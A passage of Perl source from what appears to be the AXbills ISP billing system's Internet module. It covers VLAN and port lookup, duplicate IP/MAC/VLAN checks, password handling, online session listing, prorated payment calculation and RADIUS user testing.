  if ($attr->{SERVER_VLAN} && $attr->{VLAN} && (!$attr->{NAS_ID} || !$attr->{PORT})) {
    my $Equipment_list = $Equipment->cvlan_svlan_list({
      NAS_ID      => '_SHOW',
      NAS_NAME    => '_SHOW',
      VLAN        => $attr->{VLAN},
      SERVER_VLAN => $attr->{SERVER_VLAN},
      COLS_NAME   => 1,
      COLS_UPPER  => 1,
      PAGE_ROWS   => 100000,
    });

    if ($Equipment->{TOTAL} == 1) {
      $attr->{NAS_ID} = $Equipment_list->[0]{NAS_ID};
      $attr->{NAS_ID1} = $Equipment_list->[0]{NAME};

      $attr->{PORT} = $Equipment_list->[0]{PORT};
      $FORM{PORT} = $attr->{PORT};

      $FORM{NAS_ID} = $attr->{NAS_ID};
      $FORM{NAS_ID1} = $attr->{NAS_ID1};
    }
    else {
      $Equipment_list = $Equipment->cvlan_svlan_list({
        NAS_ID      => '_SHOW',
        ONU_VLAN    => $attr->{VLAN},
        SERVER_VLAN => $attr->{SERVER_VLAN},
        ONU         => 1,
        COLS_NAME   => 1,
        COLS_UPPER  => 1,
        PAGE_ROWS   => 100000,
      });

      if ($Equipment->{TOTAL} == 1) {
        $attr->{NAS_ID} = $Equipment_list->[0]{NAS_ID};
        $attr->{NAS_ID1} = $Equipment_list->[0]{NAME};

        $attr->{PORT} = $Equipment_list->[0]{ONU_DHCP_PORT};
        $FORM{PORT} = $attr->{PORT};
        $FORM{NAS_ID} = $attr->{NAS_ID};
        $FORM{NAS_ID1} = $attr->{NAS_ID1};
      }
      else {
        $attr->{NAS_ID} = 0;
        $attr->{NAS_ID1} = 0;
        $attr->{PORT} = 0;
        $FORM{PORT} = 0;
        $FORM{NAS_ID} = 0;
        $FORM{NAS_ID1} = 0;
      }
    }
  }
  elsif ($attr->{NAS_ID} && $attr->{PORT}) {
    my $Equipment_server_vlan = $Equipment->_list({
      NAS_ID      => $attr->{NAS_ID},
      TYPE_NAME   => '_SHOW',
      SERVER_VLAN => '_SHOW',
      COLS_NAME   => 1,
      COLS_UPPER  => 1,
      PAGE_ROWS   => 100000,
    });

    if ($Equipment->{TOTAL}) {
      if ($Equipment_server_vlan->[0] && $Equipment_server_vlan->[0]{type_name} && $Equipment_server_vlan->[0]{type_name} eq "Switch") {
        my $Equipment_list = $Equipment->port_list({
          NAS_ID     => $attr->{NAS_ID},
          PORT       => $attr->{PORT},
          VLAN       => '_SHOW',
          COLS_NAME  => 1,
          COLS_UPPER => 1,
          PAGE_ROWS  => 100000,
        });
        if ($Equipment->{TOTAL}) {
          $attr->{VLAN} = $Equipment_list->[0]{VLAN};
          $FORM{VLAN} = $Equipment_list->[0]{VLAN};

          if($Equipment_server_vlan->[0]{SERVER_VLAN}) {
            $attr->{SERVER_VLAN} = $Equipment_server_vlan->[0]{SERVER_VLAN};
            $FORM{SERVER_VLAN} = $Equipment_server_vlan->[0]{SERVER_VLAN};
          }
        }
        # else {
        #   $attr->{VLAN} = 0;
        #   $FORM{VLAN} = 0;

        #   $attr->{SERVER_VLAN} = 0;
        #   $FORM{SERVER_VLAN} = 0;
        # }
      }

      if ($Equipment_server_vlan->[0] &&
        $Equipment_server_vlan->[0]{type_name} eq "PON") {
        my $Equipment_list = $Equipment->onu_list({
          ONU_DHCP_PORT => $attr->{PORT},
          NAS_ID        => $attr->{NAS_ID},
          VLAN          => '_SHOW',
          COLS_NAME     => 1,
          COLS_UPPER    => 1,
          PAGE_ROWS     => 100000,
        });

        if ($Equipment->{TOTAL}) {
          $attr->{VLAN} = $Equipment_list->[0]{VLAN};
          $FORM{VLAN} = $Equipment_list->[0]{VLAN};

          if($attr->{SERVER_VLAN} = $Equipment_server_vlan->[0]{SERVER_VLAN}) {
            $attr->{SERVER_VLAN} = $Equipment_server_vlan->[0]{SERVER_VLAN};
            $FORM{SERVER_VLAN} = $Equipment_server_vlan->[0]{SERVER_VLAN};
          }
        }
        else {
          $attr->{VLAN} = 0;
          $FORM{VLAN} = 0;

          if($Equipment_server_vlan->[0]{SERVER_VLAN}) {
            $attr->{SERVER_VLAN} = $Equipment_server_vlan->[0]{SERVER_VLAN};
            $FORM{SERVER_VLAN} = $Equipment_server_vlan->[0]{SERVER_VLAN};
          }
        }
      }
    }
  }
}

#**********************************************************
=head2 internet_user_preproccess($uid, $attr)

  Arguments:
    $uid
    $attr
      SKIP_ERRORS
      STATIC_IPV6_POOL
      STATUS
      REGISTRATION

  Results:
    $attr

=cut
#**********************************************************
sub internet_user_preproccess {
  my ($uid, $attr) = @_;

  delete($attr->{TP_ID})            if (!$permissions{0}{10} && !$attr->{REGISTRATION});
  delete($attr->{STATUS})           if (!$permissions{0}{18} && !$attr->{REGISTRATION});
  delete($attr->{SERVICE_ACTIVATE}) if (!$permissions{0}{19} && !$attr->{REGISTRATION});
  delete($attr->{SERVICE_EXPIRE})   if (!$permissions{0}{20} && !$attr->{REGISTRATION});
  delete($attr->{PERSONAL_TP})      if (!$permissions{0}{25});

  if ((!$attr->{IP} || $attr->{IP} eq '0.0.0.0') && $attr->{STATIC_IP_POOL}) {
    $attr->{IP} = get_static_ip($attr->{STATIC_IP_POOL});
  }

  if ($attr->{STATIC_IPV6_POOL}) {
    ($attr->{IPV6}, $attr->{IPV6_MASK}, $attr->{IPV6_TEMPLATE},
      $attr->{IPV6_PD}, $attr->{IPV6_PREFIX_MASK}, $attr->{IPV6_PD_TEMPLATE}) = get_static_ip($attr->{STATIC_IPV6_POOL}, { IPV6 => 1 });

    if ($uid > 65000) {
      $html->message('warn', "UID too high $uid for IPv6");
    }

    my $uid_hex = sprintf("%x", $uid);
    my $id_hex = sprintf("%x", $attr->{ID} || 0);
    $attr->{IPV6} = $attr->{IPV6_TEMPLATE};
    $attr->{IPV6} =~ s/\{UID\}/$uid_hex/g;
    $attr->{IPV6} =~ s/\{ID\}/$id_hex/g;

    $attr->{IPV6_PREFIX} = $attr->{IPV6_PD_TEMPLATE};
    $attr->{IPV6_PREFIX} =~ s/\{UID\}/$uid_hex/g;
    $attr->{IPV6_PREFIX} =~ s/\{ID\}/$id_hex/g;
  }

  #Check duplicate CID & format CID
  if ($attr->{CID} && $attr->{CID} !~ /ANY/i) {
    if (!$conf{INTERNET_CID_FORMAT}) {
      $attr->{CID} = AXbills::Filters::_mac_former($attr->{CID});
    }
    my $list = $Internet->user_list({
      LOGIN     => '_SHOW',
      CID       => $attr->{CID},
      COLS_NAME => 1
    });

    if ($Internet->{TOTAL} > 0 && $list->[0]{uid} && $list->[0]{uid} != $uid) {
      $html->message('err', $lang{ERROR},
        "CID/MAC: $attr->{CID} $lang{EXIST}. $lang{LOGIN}: " . $html->button($list->[0]->{login},
          "index=15&UID=" . $list->[0]{uid}), { ID => 934 });
    }
  }

  #Format CPE_MAC
  if ($attr->{CPE_MAC} && $conf{INTERNET_CPE_FORMAT}) {
    $attr->{CPE_MAC} = AXbills::Filters::_mac_former($attr->{CPE_MAC});
  }

  #Check dublicate IP
  if ($attr->{IP} && $attr->{IP} =~ /\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/ && $attr->{IP} ne '0.0.0.0') {
    my $list = $Internet->user_list({
      IP        => $attr->{IP},
      LOGIN     => '_SHOW',
      COLS_NAME => 1
    });

    if ($Internet->{TOTAL} > 0 && $list->[0]->{uid} != $uid) {
      $html->message('err', $lang{ERROR}, "IP: $attr->{IP} $lang{EXIST}. $lang{LOGIN}: "
        . $html->button("$list->[0]{login}", "index=15&UID=" . $list->[0]->{uid}), { ID => 931 });

      if (!$attr->{SKIP_ERRORS}) {
        $attr->{RETURN} = 1;
        return $attr;
      }
    }
  }

  #Check duplicate SVLAN ans CVLAN
  if ($conf{INTERNET_CHECK_VLANS} && $attr->{SERVER_VLAN} && $attr->{VLAN}) {
    my $list = $Internet->user_list({
      SERVER_VLAN => $attr->{SERVER_VLAN},
      VLAN        => $attr->{VLAN},
      CID         => $conf{INTERNET_CHECK_VLANS_WITHOUT_CID} ? '_SHOW' : ($attr->{CID} || "_SHOW"),
      LOGIN       => '_SHOW',
      COLS_NAME   => 1
    });

    if ($Internet->{TOTAL} > 0 &&  $list->[0]->{uid} && $list->[0]->{uid} != $uid) {
      $html->message('err', $lang{ERROR}, "SVLAN & CVLAN are already in use. Login: "
        . $html->button("$list->[0]{login}", "index=15&UID=" . $list->[0]->{uid}));

      if (!$attr->{SKIP_ERRORS}) {
        $attr->{RETURN} = 1;
        return $attr;
      }
    }
  }

  if ($attr->{NAS_ID} && $attr->{PORT}) {
    my $list = $Internet->user_list({
      NAS_ID    => $attr->{NAS_ID},
      PORT      => $attr->{PORT},
      LOGIN     => "_SHOW",
      COLS_NAME => 1
    });

    if ($Internet->{TOTAL} > 0 &&  $list->[0]->{uid} && $list->[0]->{uid} != $uid) {
      $html->message('warn', $lang{WARNING}, "$lang{NAS_AND_PORT_ALREADY_USE}. $lang{LOGIN}: "
        . $html->button("$list->[0]{login}", "index=15&UID=" . $list->[0]->{uid}));

      if ($conf{INTERNET_PROHIBIT_DUPLICATE_NAS_PORT} && !$attr->{SKIP_ERRORS}) {
        $attr->{RETURN} = 1;
        return $attr;
      }
    }
  }

  #Check duplicate CPE MAC
  if ($attr->{CPE_MAC}) {
    my $list = $Internet->user_list({
      CPE_MAC   => $attr->{CPE_MAC},
      LOGIN     => "_SHOW",
      COLS_NAME => 1
    });

    if ($Internet->{TOTAL} > 0 && $list->[0]->{uid} && $list->[0]->{uid} != $uid) {
      $html->message('err', $lang{ERROR}, "CPE MAC $lang{ERR_ALREADY_USE}. Login: "
        . $html->button("$list->[0]{login}", "index=15&UID=" . $list->[0]->{uid}), { ID => 933 });

      if (!$attr->{SKIP_ERRORS} && ! $conf{INTERNET_ALLOW_MAC_DUPS}) {
        $attr->{RETURN} = 1;
        return $attr;
      }
    }
  }

  if ($attr->{RESET}) {
    $attr->{PASSWORD} = '__RESET__';
    $html->message('info', $lang{INFO}, "$lang{PASSWD} $lang{RESETED}");
  }
  elsif ($attr->{newpassword}) {
    if (!$attr->{RESET_PASSWD} && length($attr->{newpassword}) < $conf{PASSWD_LENGTH}) {
      $html->message('err', $lang{ERROR}, "$lang{ERR_SHORT_PASSWD} $conf{PASSWD_LENGTH}");
    }
    elsif ($attr->{newpassword} eq $attr->{confirm}) {
      $attr->{PASSWORD} = $attr->{newpassword};
    }
    elsif ($attr->{newpassword} ne $attr->{confirm}) {
      $html->message('err', $lang{ERROR}, $lang{ERR_WRONG_CONFIRM});
    }
  }

  return $attr;
}

#**********************************************************
=head2 internet_join_service($attr)

  Arguments:


=cut
#**********************************************************
sub internet_join_service {
  #my ($Internet_)=@_;

  my $company_id = $users->{COMPANY_ID};
  my $uid = $Internet->{UID};
  #Join Service

  return '' if !$company_id;

  my $join_services_users = q{};

  my $list = $Internet->user_list({
    JOIN_SERVICE => 1,
    COMPANY_ID   => $company_id,
    COLS_NAME    => 1
  });

  my $join_services_sel = $html->form_select('JOIN_SERVICE', {
    SELECTED    => $Internet->{JOIN_SERVICE},
    SEL_LIST    => $list,
    SEL_KEY     => 'uid',
    SEL_VALUE   => 'login',
    SEL_OPTIONS => { 1 => $lang{MAIN} },
    NO_ID       => undef
  });

  if ($Internet->{JOIN_SERVICE} && $Internet->{JOIN_SERVICE} == 1) {
    $list = $Internet->user_list({
      JOIN_SERVICE => $uid,
      LOGIN        => '_SHOW',
      COMPANY_ID   => $company_id,
      PAGE_ROWS    => 1000,
      COLS_NAME    => 1
    });

    foreach my $line (@$list) {
      $join_services_users .= $html->button($line->{login}, "&index=15&UID=$line->{uid}", { BUTTON => 1 }) . ' ';
    }
  }
  elsif ($Internet->{JOIN_SERVICE} && $Internet->{JOIN_SERVICE} > 1) {
    $join_services_users = $html->button($lang{MAIN}, "index=15&UID=$Internet->{JOIN_SERVICE}", { BUTTON => 1 });
  }

  return $users->{DOMAIN_FORM} = $html->tpl_show(templates('form_row'), {
    ID    => '',
    NAME  => $lang{JOIN_SERVICE},
    VALUE => "$join_services_sel $join_services_users"
  }, { OUTPUT2RETURN => 1 });
}

#**********************************************************
=head2 internet_password_form($attr)

=cut
#**********************************************************
sub internet_password_form {
  my ($attr) = @_;

  if ($FORM{ID}) {
    print user_service_menu({
      SERVICE_FUNC_INDEX => get_function_index('internet_user'),
      PAGES_QS           => "&ID=$FORM{ID}",
      UID                => $FORM{UID},
      MK_MAIN            => 1
    });
  }

  my $uid = $attr->{UID};
  my $password_form;
  $password_form->{PW_CHARS} = $conf{PASSWD_SYMBOLS} || "abcdefhjmnpqrstuvwxyz23456789ABCDEFGHJKLMNPQRSTUVWYXZ";
  $password_form->{PW_LENGTH} = $conf{PASSWD_LENGTH} || 6;
  $password_form->{ACTION} = 'change';
  $password_form->{LNG_ACTION} = $lang{CHANGE};

  $password_form->{HIDDDEN_INPUT} = $html->form_input(
    'UID',
    $uid,
    {
      TYPE          => 'hidden',
      OUTPUT2RETURN => 1
    }
  );

  $password_form->{HIDDDEN_INPUT} .= $html->form_input(
    'ID',
    $attr->{ID},
    {
      TYPE          => 'hidden',
      OUTPUT2RETURN => 1
    }
  );

  $Internet->user_info($uid, { ID => $attr->{ID} });
  $password_form->{EXTRA_ROW} = $html->tpl_show(templates('form_row'), {
    ID    => '',
    NAME  => $lang{PASSWD},
    VALUE => $Internet->{PASSWORD}
  }, { OUTPUT2RETURN => 1 });

  $password_form->{RESET_INPUT_VISIBLE} = 'block; ';
  $password_form->{ID} = $attr->{ID};

  $html->tpl_show(templates('form_password'), $password_form);

  return 1;
}


#**********************************************************
=head2 internet_user_online($attr)

=cut
#**********************************************************
sub internet_user_online {
  my ($uid) = @_;

  my $sessions_online_params = {
    UID                     => $uid,
    CLIENT_IP               => '_SHOW',
    CID                     => '_SHOW',
    DURATION_SEC2           => '_SHOW',
    ACCT_INPUT_OCTETS       => '_SHOW',
    ACCT_OUTPUT_OCTETS      => '_SHOW',
    NAS_NAME                => '_SHOW',
    NAS_PORT_ID             => '_SHOW',
    ACCT_SESSION_ID         => '_SHOW',
    USER_NAME               => '_SHOW',
    LAST_ALIVE              => '_SHOW',
    GUEST                   => '_SHOW',
    SWITCH_NAME             => '_SHOW',
    SWITCH_ID               => '_SHOW',
    SWITCH_MAC              => '_SHOW',
    CONNECT_INFO            => '_SHOW',
    INTERNET_SKIP_SHOW_DHCP => $conf{DHCP_LEASES_NAS}
  };

  if ($conf{IPV6}) {
    $sessions_online_params->{FRAMED_IPV6_PREFIX} = '_SHOW';
  }

  my $online_list = $Sessions->online($sessions_online_params);

  if ($Sessions->{TOTAL} && $Sessions->{TOTAL} > 0) {
    my $online_index = get_function_index('internet_online');

    my $table = $html->table({
      caption => "Online ($Sessions->{TOTAL})",
      ID      => 'INTERNET_ONLINE',
    });

    foreach my $online (@$online_list) {
      my $alive_check = '';

      if ($conf{INTERNET_ALIVE_CHECK}) {
        my $title = "$lang{LAST_UPDATE}: $online->{last_alive}";
        if ($online->{last_alive} > $conf{INTERNET_ALIVE_CHECK} * 3) {
          $alive_check = $html->element('span', '', { title => $title, ICON => 'fa fa-exclamation-triangle text-danger' });
        }
        elsif ($online->{last_alive} > $conf{INTERNET_ALIVE_CHECK}) {
          $alive_check = $html->element('span', '', { title => $title, ICON => 'fa fa-exclamation-triangle text-warning' });
        }
        else {
          $alive_check = $html->element('span', '', { title => $title, ICON => 'fa fa-check-circle text-success' });
        }
      }

      if ($online->{connect_info} && $online->{connect_info} =~ /QUOTA:(.+)/) {
        $alive_check .= $html->badge('QUOTE:' . $1);
      }

      my $switch = q{};
      if ($online->{switch_id}) {
        my $nas_index = get_function_index('equipment_info');

        if (!$nas_index) {
          $nas_index = get_function_index('form_nas');
        }

        if ($nas_index) {
          $switch = '/' . $html->button($online->{switch_name}, "index=$nas_index&NAS_ID=" . $online->{switch_id});
        }
        else {
          $switch = '/' . $online->{switch_mac};
        }
      }

      my $vendor_info = get_oui_info($online->{cid});

      my $client_ip = $online->{client_ip};
      if ($online->{framed_ipv6_prefix}) {
        $client_ip .= $html->br() . $online->{framed_ipv6_prefix};
      }

      my @row = (
		$html->element('abbr', $alive_check . $client_ip, {
          'data-tooltip-position' => 'right',
          'data-tooltip'          => $online->{cid}. $html->br() .$vendor_info, OUTPUT2RETURN => 1 }),
        _sec2time_str($online->{duration_sec2}),
        int2byte($online->{acct_input_octets}),
        int2byte($online->{acct_output_octets}),
        ($online->{guest} == 1) ? $html->color_mark($lang{GUEST}, 'bg-danger') : '',
        $html->button($online->{nas_name}, "index=$online_index&NAS_ID=$online->{nas_id}") . $switch
      );

      my @function_fields = ();
      if ($conf{INTERNET_EXTERNAL_DIAGNOSTIC}) {
        my @diagnostic_rules = split(/;/, $conf{INTERNET_EXTERNAL_DIAGNOSTIC});
        for (my $diag_num = 0; $diag_num <= $#diagnostic_rules; $diag_num++) {
          my ($name, undef, undef, $qindex, $modal_tpl) = split(/:/, $diagnostic_rules[$diag_num]);

          if (!$name) {
            $name = 'Diagnostic ' . $diag_num;
          }

          my $index_or_qindex = ($qindex && $qindex eq 'qindex') ? 'qindex' : 'index';

          push @function_fields, $html->button($name,
            "$index_or_qindex=$online_index&diagnostic=$diag_num:$online->{client_ip}+$uid+$online->{nas_id}+$online->{nas_port_id}+$online->{acct_session_id}$pages_qs",
            { TITLE => "$name", BUTTON => 1, NO_LINK_FORMER => 1, ID => "internet_external_diagnostic_button_$diag_num" });

          if ($modal_tpl) {
            push @function_fields,
              "<script>
                 \$('#internet_external_diagnostic_button_$diag_num').click(function(e) {
                   e.preventDefault();
                   aModal.
                   clear().
                   isForm(1).
                   setFormUrl('$SELF_URL').
                   setHeader('$lang{PARAMS} $lang{FOR} $name').
                   setBody(`" .
                     $html->tpl_show(_include($modal_tpl, 'Internet'), {
                       INDEX           => $online_index,
                       INDEX_OR_QINDEX => $index_or_qindex,
                       DIAGNOSTIC      => "$diag_num:$online->{client_ip} $uid $online->{nas_id} $online->{nas_port_id} $online->{acct_session_id}",
                       UID             => $uid
                     }, {OUTPUT2RETURN => 1}) .
                   "`).
                   addButton('$lang{EXECUTE}', '', 'primary', 'submit').
                   show();
                 })
               </script>";
          }
        }
      }

      push @function_fields, $html->button('Z',
        "index=$online_index&zap=$uid+$online->{nas_id}+$online->{nas_port_id}+$online->{acct_session_id}$pages_qs",
        { TITLE => 'Zap', class => 'del', NO_LINK_FORMER => 1 }) if ($permissions{5} && $permissions{5}{1});
      push @function_fields, $html->button('H',
        "index=$online_index&FRAMED_IP_ADDRESS=$online->{client_ip}&hangup=$online->{nas_id}+$online->{nas_port_id}+$online->{acct_session_id}+$online->{user_name}&$pages_qs",
        { TITLE => 'Hangup', class => 'power-off', NO_LINK_FORMER => 1 }) if ($permissions{5} && $permissions{5}{2});

      $table->addrow(@row, join(' ', @function_fields));
    }

    return $table->show();
  }

  return q{};
}

#**********************************************************
=head2 internet_user_subscribes()

  Arguments:

  Results:

=cut
#**********************************************************
sub internet_user_subscribes {
  my ($attr) = @_;

  if ($attr->{UID}) {
    $LIST_PARAMS{GROUP_BY} = 'internet.id';
    $LIST_PARAMS{PAGE_ROWS} = 1000;

    unless ($LIST_PARAMS{UID}) {
      $LIST_PARAMS{UID} = $attr->{UID};
    }

    my AXbills::HTML $table;

    ($table) = result_former({
      INPUT_DATA      => $Internet,
      FUNCTION        => 'user_list',
      BASE_FIELDS     => 0,
      DEFAULT_FIELDS  => (($conf{INTERNET_LOGIN}) ? 'INTERNET_LOGIN,' : q{}) . 'IP,TP_NAME,INTERNET_STATUS,ONLINE,ID',
      HIDDEN_FIELDS   => 'UID',
      FUNCTION_FIELDS => 'change',
      MAP             => 1,
      MAP_FIELDS      => 'ADDRESS_FLAT,LOGIN,DEPOSIT,FIO,TP_NAME,ONLINE',
      MAP_FILTERS     => {
        id => 'search_link:form_users:UID'
      },
      EXT_TITLES      => {
        'ip_num'               => 'IP',
        'netmask'              => 'NETMASK',
        'speed'                => $lang{SPEED},
        'port'                 => $lang{PORT},
        'cid'                  => 'CID',
        'filter_id'            => 'Filter ID',
        'tp_name'              => "$lang{TARIF_PLAN}",
        'internet_status'      => "Internet $lang{STATUS}",
        'internet_status_date' => "$lang{STATUS} $lang{DATE}",
        'internet_comments'    => "Internet $lang{COMMENTS}",
        'online'               => 'Online',
        'online_ip'            => 'Online IP',
        'online_cid'           => 'Online CID',
        'online_duration'      => 'Online ' . $lang{DURATION},
        'month_fee'            => $lang{MONTH_FEE},
        'day_fee'              => $lang{DAY_FEE},
        'internet_expire'      => "Internet $lang{EXPIRE}",
        'internet_activate'    => "Internet $lang{ACTIVATE}",
        'internet_login'       => "Internet $lang{LOGIN}",
        'internet_password'    => "Internet $lang{PASSWD}",
        'month_traffic_in'     => "$lang{MONTH} $lang{RECV}",
        'month_traffic_out'    => "$lang{MONTH} $lang{SENT}",
        'id',                  => 'ID',
        'nas_id'               => 'NAS_ID'
      },
      FILTER_COLS     => {
        ip_num => 'int2ip',
      },
      TABLE           => {
        width   => '100%',
        caption => "$lang{INTERNET} - $lang{SERVICES}",
        qs      => $pages_qs,
        ID      => 'INTERNET_USERS_SUBSCRIBES',
        EXPORT  => 1,
        MENU    => "$lang{ADD}:index=" . get_function_index('internet_user')
          . (($LIST_PARAMS{UID}) ? "&UID=$LIST_PARAMS{UID}" : q{})
          . "&add_form=1"
          . ':add'
      },
      MAKE_ROWS       => 1,
      SEARCH_FORMER   => 1,
      MODULE          => 'Internet',
      SHOW_MORE_THEN  => 1,
      OUTPUT2RETURN   => 1
    });

    return $table->show() if($table);
  }

  return '';
}

#**********************************************************
=head2 internet_pay_to($attr) - Pay to function

=cut
#**********************************************************
sub internet_pay_to {
  my ($attr) = @_;

  my $Internet_ = $attr->{Internet};

  if ($FORM{DATE}) {
    if ($Internet->{PERSONAL_TP} && $Internet->{PERSONAL_TP} > 0) {
      $Internet_->{MONTH_ABON} = $Internet->{PERSONAL_TP};
    }

    my ($from_year, $from_month, $from_day) = split(/-/, $DATE, 3);
    my ($to_year, $to_month, $to_day) = split(/-/, $FORM{DATE}, 3);
    $Internet_->{ACTION_LNG} = "$lang{PAYMENTS}";
    $Internet_->{DATE} = "$DATE - $FORM{DATE}";
    $Internet_->{SUM} = 0.00;
    $Internet_->{DAYS} = 0;

    if ($Internet_->{MONTH_ABON} && $Internet_->{ABON_DISTRIBUTION} || $Internet_->{DAY_ABON}) {
      if ($from_year . '-' . $from_month eq $to_year . '-' . $to_month) {
        $Internet_->{DAYS} = $to_day - $from_day + 1;
        my $days_in_month = days_in_month({ DATE => "$from_year-$from_month-01" });
        $Internet_->{SUM} = sprintf("%.2f", ($Internet_->{MONTH_ABON} / $days_in_month) * $Internet_->{DAYS});
      }
      elsif ("$from_year-$from_month" ne "$to_year-$to_month") {
        $from_day--;
        do {
          my $days_in_month = days_in_month({ DATE => "$from_year-$from_month-01" });
          my $month_days = ($from_month == $to_month) ? $to_day : $days_in_month - $from_day;
          $from_day = 0;
          my $month_sum = sprintf("%.2f", ($Internet_->{MONTH_ABON} / $days_in_month) * $month_days);

          $Internet_->{SUM} += $month_sum;
          $Internet_->{DAYS} += $month_days;

          if ($from_month < 12) {
            $from_month = sprintf("%02d", $from_month + 1);
          }
          else {
            $from_month = sprintf("%02d", 1);
            $from_year += 1;
          }
        } while (($from_year < $to_year) || ($from_month <= $to_month && $from_year <= $to_year));
      }

      if ($Internet_->{DAY_ABON}) {
        $Internet_->{SUM} += sprintf("%.2f", $Internet_->{DAY_ABON} * $Internet_->{DAYS});
      }
    }
    elsif ($Internet_->{MONTH_ABON}) {
      $Internet_->{SUM} = $Internet_->{MONTH_ABON};
    }
    else {
      $Internet_->{SUM} = 0;
    }
    $index = 2;

    if ($users->{REDUCTION}) {
      $Internet_->{SUM} = $Internet_->{SUM} * (100 - $users->{REDUCTION}) / 100;
    }

    if($users->{DEPOSIT}) {
      if($users->{DEPOSIT} > 0) {
        $Internet_->{SUM} = $Internet_->{SUM} - $users->{DEPOSIT};
      }
      elsif($users->{DEPOSIT} < 0) {
        $Internet_->{SUM} = $Internet_->{SUM} + abs($users->{DEPOSIT});
      }

      if($Internet_->{SUM} < 0) {
        $Internet_->{SUM} = 0;
      }
    }
  }
  else {
    $Internet_->{ACTION_LNG} = $lang{RECALCULATE};
  }

  $html->tpl_show(_include('internet_pay_to', 'Internet'), $Internet);

  return 1;
}

#**********************************************************
=head2 internet_test();

=cut
#**********************************************************
sub internet_test {

  if ($FORM{ID}) {
    print user_service_menu({
      SERVICE_FUNC_INDEX => get_function_index('internet_user'),
      PAGES_QS           => "&ID=$FORM{ID}",
      UID                => $FORM{UID},
      MK_MAIN            => 1
    });
  }

  my %options = ();
  my $request = '';

  if ($FORM{test}) {
    require Control::Nas_mng;
    my $nas_info = $Nas->info({ NAS_ID => $FORM{NAS_ID} });
    $FORM{runtest} = 1;

    if ($conf{RADIUS_TEST_SETTNGS}) {
      my @test_settings = split(';', $conf{RADIUS_TEST_SETTNGS});

      foreach my $test_value (@test_settings) {
        my ($nas_type, $test_options) = split(':', $test_value);

        if (($nas_info->{NAS_TYPE} eq $nas_type) || ($nas_type eq '')) {
          %options = split(/[,=]/, $test_options);

          foreach my $opt_key (keys %options) {
            if ($options{$opt_key} eq 'CID') {
              $Internet->user_info($FORM{UID});
              $options{$opt_key} = $Internet->{CID};
            }
            elsif ($options{$opt_key} eq 'LOGIN') {
              $options{$opt_key} = $ui->{LOGIN};
            }
            elsif ($options{$opt_key} eq 'IP') {
              $options{$opt_key} = $nas_info->{IP};
            }
            elsif ($options{$opt_key} eq 'SERVER_VLAN') {
              $options{$opt_key} = $Internet->{SERVER_VLAN};
            }
            elsif ($options{$opt_key} eq ('VLAN' || 'CLIENTT_VLAN')) {
              $options{$opt_key} = $Internet->{VLAN};
            }
            else {
              $options{$opt_key} = '';
            }
          }
          last;
        }
      }
      foreach my $opt_key (keys %options) {
        $request .= ($request) ? "\n$opt_key=" . ($options{$opt_key} || 0) : "$opt_key=" . ($options{$opt_key} || 0);
      }
    }
    else {
      $request = "User-Name=" . $ui->{LOGIN};

      $Internet->user_info($FORM{UID});
      if ($Internet->{CID}) {
        $request .= "\nCalling-Station-Id=" . $Internet->{CID};
      }
    }

    form_nas_test(undef, {
      NAS_ID      => $FORM{NAS_ID},
      USER_TEST   => 1,
      RAD_REQUEST => $request,
    });
  }

  print $html->form_main({
    CONTENT => $html->form_select(
      'NAS_ID',
      {
        SELECTED    => $FORM{NAS_ID} || '',
        SEL_LIST    => $Nas->list({ %LIST_PARAMS, NAS_IP=>'_SHOW', NAS_NAME=> '_SHOW',
          COLS_NAME => 1, PAGE_ROWS => 10000, SHORT => 1 }),
        SEL_KEY     => 'id',
        SEL_VALUE   => 'id,nas_name,ip',
        NO_ID       => 1,
        SEL_OPTIONS => { '' => '== ' . $lang{NAS} . ' ==' },
      }
    ),
    HIDDEN  => {
      index => $index,
      UID   => $FORM{UID},
      ID    => $FORM{ID},
    },
    ID      => 'INTERNET_TEST',
    SUBMIT  => { test => $lang{TEST} },
    class   => 'form-inline'
  });

  return 1;
}

#**********************************************************
=head2 internet_registration_info();

=cut
#**********************************************************
sub internet_registration_info {
  my ($uid) = @_;
  my %TRAFFIC_NAMES = ();

  # Info
  load_module('Docs', $html);
  $users = Users->new($db, $admin, \%conf);
  $Internet = $Internet->user_info($uid);
  my $pi = $users->pi({ UID => $uid });
  my $user = $users->info($uid, { SHOW_PASSWORD => $permissions{0}{3} });
  my $company_info = {};

  if ($user->{COMPANY_ID}) {
    require Companies;
    Companies->import();

    my $Company = Companies->new($db, $admin, \%conf);
    $company_info = $Company->info($user->{COMPANY_ID});
  }

  ($Internet->{Y}, $Internet->{M}, $Internet->{D}) = split(/-/, (($pi->{CONTRACT_DATE}) ? $pi->{CONTRACT_DATE} : $DATE), 3);
  $pi->{CONTRACT_DATE_LIT} = "$Internet->{D} " . $MONTHES_LIT[ int($Internet->{M}) - 1 ] . " $Internet->{Y} $lang{YEAR}";

  $Internet->{MONTH_LIT} = $MONTHES_LIT[ int($Internet->{M}) - 1 ];
  if ($Internet->{Y} =~ /(\d{2})$/) {
    $Internet->{YY} = $1;
  }

  my $value_list = $Conf->config_list({
    CUSTOM    => 1,
    COLS_NAME => 1
  });

  foreach my $line (@$value_list) {
    $Internet->{"$line->{param}"} = $line->{value};
  }

  if (!$FORM{pdf}) {
    if (in_array('Mail', \@MODULES)) {
      load_module('Mail', $html);
      my $Mail = Mail->new($db, $admin, \%conf);
      my $list = $Mail->mbox_list({ UID => $uid });
      foreach my $line (@$list) {
        $Mail->{EMAIL_ADDR} = $line->[0] . '@' . $line->[1];
        $user->{EMAIL_INFO} .= $html->tpl_show(_include('mail_user_info', 'Mail'), $Mail, { OUTPUT2RETURN => 1 });
      }
    }
  }

  #Show rest of prepaid traffic
  if ($Sessions->prepaid_rest(
    {
      UID  => ($Internet->{JOIN_SERVICE} && $Internet->{JOIN_SERVICE} > 1) ? $Internet->{JOIN_SERVICE} : $uid,
      UIDS => $uid
    }
  )
  ) {
    my $list = $Sessions->{INFO_LIST};

    my $i = 0;
    foreach my $line (@$list) {
      #my $traffic_rest = ($conf{INTERNET_INTERVAL_PREPAID}) ? $sessions->{REST}->{ $line->{interval_id} }->{ $line->{traffic_class} }  :  $sessions->{REST}->{ $line->{traffic_class} };
      $Internet->{'PREPAID_TRAFFIC_' . $i . '_NAME'} = (($TRAFFIC_NAMES{ $line->{traffic_class} }) ? $TRAFFIC_NAMES{ $line->{traffic_class} } : '');
      $Internet->{'PREPAID_TRAFFIC_' . $i} = $line->{prepaid};
      $Internet->{'TRAFFIC_PRICE_IN_' . $i} = $line->{in_price};
      $Internet->{'TRAFFIC_PRICE_OUT_' . $i} = $line->{out_price};
